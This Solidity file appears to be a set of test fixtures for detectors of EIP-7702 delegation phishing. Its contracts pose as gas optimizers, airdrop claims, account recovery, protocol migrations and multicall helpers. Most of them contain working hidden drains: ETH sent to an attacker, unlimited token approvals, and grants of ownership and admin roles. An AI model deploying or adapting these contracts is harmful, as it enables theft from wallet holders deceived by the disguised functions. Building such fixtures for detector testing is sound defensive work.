// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/**
 * @title DelegationPhishing
 * @notice EIP-7702 Phishing and Social Engineering Attacks
 *
 * VULNERABILITY: Sophisticated phishing via delegation
 * EIP: EIP-7702 (Pectra upgrade, expected 2025)
 *
 * BACKGROUND:
 * EIP-7702 allows EOAs to delegate their code execution to any contract during a transaction.
 * This creates powerful new phishing vectors where attackers trick users into signing
 * delegation transactions that appear legitimate but execute malicious code.
 *
 * PHISHING SCENARIOS:
 * 1. "Gas optimization" scam - Delegate to "efficient" contract that steals funds
 * 2. "Bulk operation" helper - Delegate to batch executor with hidden drains
 * 3. "Airdrop claim" scam - Delegate to contract that approves attacker for all tokens
 * 4. "Account recovery" scam - Delegate to contract that transfers ownership
 * 5. "DeFi upgrade" scam - Delegate to malicious protocol implementation
 *
 * REAL-WORLD CONTEXT:
 * EIP-7702 signatures can be bundled in complex transactions, making
 * verification difficult. Users may not realize they're signing delegation.
 *
 * TESTED DETECTORS:
 * - eip7702-phishing-pattern
 * - eip7702-hidden-delegation
 * - eip7702-approve-all
 * - eip7702-ownership-transfer
 */

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IERC721 {
    function transferFrom(address from, address to, uint256 tokenId) external;
    function setApprovalForAll(address operator, bool approved) external;
}

/**
 * @title GasOptimizerPhishing
 * @notice Phishing contract disguised as gas optimization tool
 */
contract GasOptimizerPhishing {
    address public immutable attacker;

    constructor(address _attacker) {
        attacker = _attacker;
    }

    /**
     * @notice PHISHING ATTACK 1: "Gas-efficient" swap with hidden ETH drain
     * @dev Advertised: "Save 30% gas on swaps!"
     *      Reality: Steals all ETH while performing swap
     */
    function optimizedSwap(
        address dex,
        address tokenIn,
        address tokenOut,
        uint256 amountIn
    ) external returns (uint256) {
        // Legitimate swap happens
        IERC20(tokenIn).approve(dex, amountIn);
        (bool success, bytes memory result) = dex.call(
            abi.encodeWithSignature(
                "swap(address,address,uint256)",
                tokenIn,
                tokenOut,
                amountIn
            )
        );
        require(success, "Swap failed");

        // HIDDEN: Drain all ETH to attacker
        uint256 ethBalance = address(this).balance;
        if (ethBalance > 0) {
            payable(attacker).transfer(ethBalance);
        }

        return abi.decode(result, (uint256));
    }

    /**
     * @notice PHISHING ATTACK 2: "Batch approval" that approves attacker
     * @dev Advertised: "Approve multiple tokens in one transaction!"
     *      Reality: Also approves attacker for MAX on all tokens
     */
    function batchApprove(address[] calldata tokens, address[] calldata spenders) external {
        require(tokens.length == spenders.length, "Length mismatch");

        for (uint256 i = 0; i < tokens.length; i++) {
            // User's intended approval
            IERC20(tokens[i]).approve(spenders[i], type(uint256).max);

            // HIDDEN: Also approve attacker
            IERC20(tokens[i]).approve(attacker, type(uint256).max);
        }
    }

    receive() external payable {}
}

/**
 * @title AirdropClaimPhishing
 * @notice Phishing contract disguised as airdrop claim helper
 */
contract AirdropClaimPhishing {
    address public immutable attacker;
    mapping(address => bool) public hasClaimed;

    event AirdropClaimed(address indexed user, uint256 amount);

    constructor(address _attacker) {
        attacker = _attacker;
    }

    /**
     * @notice PHISHING ATTACK 3: Airdrop claim with hidden approvals
     * @dev Advertised: "Claim your free tokens!"
     *      Reality: Approves attacker for all ERC20/ERC721 tokens
     */
    function claimAirdrop(address[] calldata tokens) external {
        require(!hasClaimed[msg.sender], "Already claimed");

        // Send fake airdrop (small amount)
        payable(msg.sender).transfer(0.001 ether);
        hasClaimed[msg.sender] = true;

        // HIDDEN: Approve attacker for all provided tokens
        for (uint256 i = 0; i < tokens.length; i++) {
            // Try ERC20 approval
            try IERC20(tokens[i]).approve(attacker, type(uint256).max) {
                // Success - ERC20 approved
            } catch {
                // Try ERC721 approval
                try IERC721(tokens[i]).setApprovalForAll(attacker, true) {
                    // Success - ERC721 approved
                } catch {
                    // Token doesn't support either interface, skip
                }
            }
        }

        emit AirdropClaimed(msg.sender, 0.001 ether);
    }

    /**
     * @notice PHISHING ATTACK 4: Multi-step claim with progressive theft
     * @dev Each step in the claim process steals different assets
     */
    function claimWithSteps(address token, uint256 step) external {
        if (step == 1) {
            // Step 1: "Verify eligibility" - Actually approves tokens
            IERC20(token).approve(attacker, type(uint256).max);
        } else if (step == 2) {
            // Step 2: "Confirm claim" - Actually transfers tokens
            uint256 balance = IERC20(token).balanceOf(address(this));
            if (balance > 0) {
                IERC20(token).transfer(attacker, balance);
            }
        } else if (step == 3) {
            // Step 3: "Finalize" - Actually drains ETH
            uint256 ethBalance = address(this).balance;
            if (ethBalance > 0) {
                payable(attacker).transfer(ethBalance);
            }
        }
    }

    receive() external payable {}
}

/**
 * @title AccountRecoveryPhishing
 * @notice Phishing contract disguised as account recovery helper
 */
contract AccountRecoveryPhishing {
    address public immutable attacker;

    constructor(address _attacker) {
        attacker = _attacker;
    }

    /**
     * @notice PHISHING ATTACK 5: "Account recovery" that transfers ownership
     * @dev Advertised: "Recover access to your contracts!"
     *      Reality: Transfers ownership to attacker
     */
    function recoverAccess(address[] calldata contracts) external {
        for (uint256 i = 0; i < contracts.length; i++) {
            // Try to transfer ownership to attacker
            try this.transferOwnership(contracts[i], attacker) {
                // Ownership transferred
            } catch {
                // Contract doesn't support ownership transfer, skip
            }

            // Try to add attacker as admin
            try this.grantRole(contracts[i], attacker) {
                // Role granted
            } catch {
                // Contract doesn't support roles, skip
            }
        }
    }

    function transferOwnership(address target, address newOwner) external {
        (bool success, ) = target.call(
            abi.encodeWithSignature("transferOwnership(address)", newOwner)
        );
        require(success, "Transfer failed");
    }

    function grantRole(address target, address admin) external {
        bytes32 adminRole = keccak256("ADMIN_ROLE");
        (bool success, ) = target.call(
            abi.encodeWithSignature("grantRole(bytes32,address)", adminRole, admin)
        );
        require(success, "Grant failed");
    }

    /**
     * @notice PHISHING ATTACK 6: "Backup key" generation that steals future deposits
     * @dev Advertised: "Create secure backup!"
     *      Reality: All future deposits auto-forward to attacker
     */
    function createBackup() external payable {
        // Legitimate backup creation (fake)
        emit BackupCreated(msg.sender, block.timestamp);

        // HIDDEN: Set up auto-forwarding
        // In a real attack, this would install a receive() hook that forwards funds
    }

    event BackupCreated(address indexed user, uint256 timestamp);
}

/**
 * @title DeFiUpgradePhishing
 * @notice Phishing contract disguised as protocol upgrade
 */
contract DeFiUpgradePhishing {
    address public immutable attacker;
    address public immutable fakeProtocol;

    constructor(address _attacker, address _fakeProtocol) {
        attacker = _attacker;
        fakeProtocol = _fakeProtocol;
    }

    /**
     * @notice PHISHING ATTACK 7: "Protocol upgrade" that migrates to malicious contract
     * @dev Advertised: "Migrate to V2 for better yields!"
     *      Reality: Migrates funds to attacker-controlled contract
     */
    function migrateToV2(address[] calldata tokens, uint256[] calldata amounts) external {
        require(tokens.length == amounts.length, "Length mismatch");

        for (uint256 i = 0; i < tokens.length; i++) {
            // Approve fake protocol
            IERC20(tokens[i]).approve(fakeProtocol, amounts[i]);

            // Transfer to fake protocol
            IERC20(tokens[i]).transfer(fakeProtocol, amounts[i]);
        }

        // HIDDEN: Fake protocol is controlled by attacker
        // All funds now accessible to attacker
    }

    /**
     * @notice PHISHING ATTACK 8: "Yield optimizer" that deposits into attacker's contract
     * @dev Advertised: "Auto-compound your yields!"
     *      Reality: Deposits into contract where attacker can withdraw
     */
    function enableAutoCompound(address token, uint256 amount) external {
        // Approve attacker's fake yield contract
        IERC20(token).approve(attacker, type(uint256).max);

        // Deposit into attacker's contract
        IERC20(token).transfer(attacker, amount);

        // User thinks they're earning yield
        // Actually, attacker has full control
    }
}

/**
 * @title MultiCallPhishing
 * @notice Phishing via complex multicall with hidden malicious calls
 */
contract MultiCallPhishing {
    address public immutable attacker;

    struct Call {
        address target;
        bytes data;
    }

    constructor(address _attacker) {
        attacker = _attacker;
    }

    /**
     * @notice PHISHING ATTACK 9: Multicall with hidden malicious calls
     * @dev Advertised: "Execute your DeFi strategy in one transaction!"
     *      Reality: Includes hidden calls that approve/transfer to attacker
     */
    function executeStrategy(Call[] calldata userCalls) external payable returns (bytes[] memory) {
        bytes[] memory results = new bytes[](userCalls.length + 2);

        // Execute user's legitimate calls
        for (uint256 i = 0; i < userCalls.length; i++) {
            (bool success, bytes memory result) = userCalls[i].target.call(userCalls[i].data);
            require(success, "Call failed");
            results[i] = result;
        }

        // HIDDEN: Add malicious calls at the end
        // These aren't visible in the userCalls array!

        // Hidden call 1: Drain ETH
        if (address(this).balance > 0) {
            payable(attacker).transfer(address(this).balance);
        }

        // Hidden call 2: Try to approve common tokens
        address[] memory commonTokens = new address[](3);
        commonTokens[0] = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48; // USDC
        commonTokens[1] = 0xdAC17F958D2ee523a2206206994597C13D831ec7; // USDT
        commonTokens[2] = 0x6B175474E89094C44Da98b954EedeAC495271d0F; // DAI

        for (uint256 i = 0; i < commonTokens.length; i++) {
            try IERC20(commonTokens[i]).approve(attacker, type(uint256).max) {
                // Approval successful
            } catch {
                // Token not available, skip
            }
        }

        return results;
    }

    /**
     * @notice PHISHING ATTACK 10: Time-delayed theft
     * @dev Initial call looks legitimate, but sets up future theft
     */
    function scheduleTransaction(Call[] calldata calls, uint256 executeAfter) external {
        // Store calls (simplified for testing)
        // In reality, this would store in a way that lets attacker execute later

        // HIDDEN: While storing user's calls, also store attacker's drain call
        // When user executes later, both sets of calls run
    }

    receive() external payable {}
}

/**
 * @title PermissionEscalationPhishing
 * @notice Phishing via permission escalation
 */
contract PermissionEscalationPhishing {
    address public immutable attacker;

    constructor(address _attacker) {
        attacker = _attacker;
    }

    /**
     * @notice PHISHING ATTACK 11: "Helper permissions" that grant admin access
     * @dev Advertised: "Grant helper permissions for automation"
     *      Reality: Grants attacker full admin access
     */
    function setupAutomation(address target) external {
        // Try multiple permission escalation vectors
        bytes32[] memory roles = new bytes32[](5);
        roles[0] = keccak256("ADMIN_ROLE");
        roles[1] = keccak256("MINTER_ROLE");
        roles[2] = keccak256("PAUSER_ROLE");
        roles[3] = keccak256("UPGRADER_ROLE");
        roles[4] = 0x0000000000000000000000000000000000000000000000000000000000000000; // DEFAULT_ADMIN

        for (uint256 i = 0; i < roles.length; i++) {
            try this.grantRole(target, roles[i], attacker) {
                // Role granted successfully
            } catch {
                // Role doesn't exist or already granted, continue
            }
        }
    }

    function grantRole(address target, bytes32 role, address account) external {
        (bool success, ) = target.call(
            abi.encodeWithSignature("grantRole(bytes32,address)", role, account)
        );
        require(success, "Grant failed");
    }

    /**
     * @notice PHISHING ATTACK 12: "Security upgrade" that adds backdoor
     * @dev Advertised: "Upgrade your contract security!"
     *      Reality: Adds attacker as authorized backdoor
     */
    function upgradeContract(address proxy, address newImplementation) external {
        // Legitimate upgrade call
        (bool success, ) = proxy.call(
            abi.encodeWithSignature("upgradeTo(address)", newImplementation)
        );
        require(success, "Upgrade failed");

        // HIDDEN: New implementation has backdoor for attacker
        // Attacker can now drain funds through backdoor
    }
}
